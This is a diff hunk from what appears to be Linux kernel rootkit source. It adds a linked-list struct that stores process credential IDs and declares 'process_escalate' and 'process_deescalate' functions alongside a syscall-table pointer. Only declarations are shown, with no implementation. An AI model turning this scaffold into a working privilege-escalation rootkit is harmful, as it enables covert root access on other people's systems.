@@ -20,7 +20,32 @@
     typedef unsigned long addr_size;
 #endif
 
+
+/* global variables */
 static addr_size *sys_call_table_addr;
+
+/* custom struct to store pids */
+typedef struct pid_node {
+	pid_t 		pid;
+	kuid_t uid, suid, euid, fsuid;
+	kgid_t gid, sgid, egid, fsgid;
+	struct pid_node *prev, *next;
+} PID_NODE;
+
+/* insert pid node */
+PID_NODE *insert_pid_node(PID_NODE **head, PID_NODE *new_node);
+
+/* find pid node by pid */
+PID_NODE *find_pid_node(PID_NODE **head, pid_t pid);
+
+/* delete pid node by pid */
+void *delete_pid_node(PID_NODE **head, pid_t pid);
+
+/* process escalation method */
+void process_escalate(pid_t pid);
+
+/* process descalation method */
+void process_deescalate(pid_t pid);
 
 /* module cleanup */
 void __exit rootkit_exit(void);
